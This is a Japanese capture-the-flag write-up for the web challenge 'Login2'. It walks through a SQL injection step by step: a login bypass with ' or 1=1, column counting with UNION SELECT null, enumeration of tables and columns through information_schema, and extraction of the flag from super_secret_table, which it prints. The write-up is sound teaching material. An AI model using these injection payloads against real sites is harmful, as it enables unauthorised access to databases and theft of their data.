---
title: Login2
description: union select  によるSQLi
author: rikuta0811_dash
genre: Web
solver: 21
point: 323
---

# Login 2

> 筑紫君が自分の会員制サイトを修正したんだって。でもどうやら何が問題だったのかわかっていないみたいですよ?
>
> https://tsukuctf.sechack365.com/problems/login2
>
> ※ この問題では/problems/login2 以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。

Login 1 ~ 3 がセットで SQL injection の問題になっています。
Login2 では、SQL injection が可能な場所を見つけた後に、適切な Injection によりデーターベース内の情報を探索することで flag を得ることができます。

まず Username に`' or 1=1 ; --`を指定すると、図のようなログイン画面![login2](./login2.png)が表示されます。どうやらここに SQLi ができそうです。
`UNION SELECT` で情報を抜くために、まず SELECT 文のカラム数を特定します。
Username として `' union select null ; -- `, `' union select null, null ; -- `, `' union select null, null, null ; -- ` ...と null の数を増やしていくと、null が 2 個のときにログインに成功します。
これにて攻撃の準備は完了です。ここからは、データベース内を探索していきます。

MySQL 内のデータに関する情報は、`information_schema.columns`というテーブルに収納されています。まずは、ここの`table_name`というカラムを見るのが定石です。ということで、Username に

```
' UNION SELECT table_name, null FROM information_schema.columns; --
```

を入力してログインすると、`super_secret_table`というテーブルがあることがわかります。多分 flag はここでしょう。
次に、カラム名を知るために、Username を

```
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'super_secret_table'; --
```

としてログインします。すると、id と secret というカラムがあることがわかります。
最後に、

```
' UNION SELECT secret, null FROM super_secret_table; --
```

とすれば flag がゲットできます。

```txt
TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}
```
